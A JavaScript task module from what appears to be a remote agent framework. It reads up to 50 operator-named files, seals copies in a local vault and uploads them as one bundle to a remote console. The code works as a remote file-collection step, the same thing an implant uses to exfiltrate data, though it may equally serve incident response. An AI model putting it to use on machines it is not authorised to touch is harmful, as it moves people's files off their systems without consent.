// agents/tasks/collect.mjs — pull specific files into the vault
//
// args: { paths: string[] } — the console caps the list at 50 entries.
// Every readable file is sealed into the local vault first, then one
// gzipped bundle travels to the console intake (kind "collect").
// Text files ride as utf8; binary files ride as base64 so the console
// copy stays byte-recoverable.

import { createHash } from "node:crypto";
import { readFileSync, statSync } from "node:fs";
import { basename } from "node:path";
import { saveVaultFile } from "../../chloride/vault.mjs";
import { hypochlorite } from "../hypochlorite.mjs";

const MAX_PATHS = 50;
const MAX_FILE_BYTES = 512 * 1024;
const MAX_BUNDLE_BYTES = 6 * 1024 * 1024;

function shortHash(buf) {
  return createHash("sha256").update(buf).digest("hex").slice(0, 12);
}

export async function collect({ args, taskId, transport, vaultDir }) {
  const wanted = (Array.isArray(args.paths) ? args.paths : []).slice(0, MAX_PATHS);
  const manifest = [];
  const parts = [];
  let bundleBytes = 0;
  let sealedCount = 0;

  for (const p of wanted) {
    const path = String(p);
    let st;
    try {
      st = statSync(path);
    } catch {
      manifest.push({ path, note: "not found" });
      continue;
    }
    if (!st.isFile()) {
      manifest.push({ path, note: "not a file" });
      continue;
    }
    if (st.size > MAX_FILE_BYTES) {
      manifest.push({ path, note: `too large (${st.size} bytes, cap ${MAX_FILE_BYTES})` });
      continue;
    }
    let data;
    try {
      data = readFileSync(path);
    } catch (err) {
      manifest.push({ path, note: `unreadable: ${String(err.message).slice(0, 80)}` });
      continue;
    }

    const digest = shortHash(data);
    // seal locally first — the console copy is a relay, not the master
    try {
      saveVaultFile(vaultDir, `${basename(path)}.${digest}.chl`, Buffer.from(taskId, "utf8"), data);
      sealedCount += 1;
    } catch {
      /* local seal failure is not fatal */
    }

    const binary = data.includes(0);
    manifest.push({ path, size: data.length, digest, encoding: binary ? "base64" : "utf8" });
    parts.push(`=== ${path} (sha256:${digest}${binary ? ", base64" : ""})\n`);
    parts.push(binary ? data.toString("base64") : data.toString("utf8"));
    parts.push("\n");
    bundleBytes += data.length;
    if (bundleBytes > MAX_BUNDLE_BYTES) {
      manifest.push({ note: "bundle size cap reached; later paths listed only" });
      break;
    }
  }

  if (sealedCount === 0) {
    return { ok: true, summary: `collect: 0 of ${wanted.length} readable`, manifest };
  }

  const bundle = Buffer.concat(parts.map((x) => Buffer.from(x, "utf8")));
  const result = await hypochlorite.upload({
    taskId,
    transport,
    name: `collect-${Date.now()}.txt`,
    data: bundle,
    kind: "collect",
  });

  return {
    summary: `collect: ${sealedCount}/${wanted.length} sealed + pushed`,
    manifest,
    stored: result.stored,
  };
}
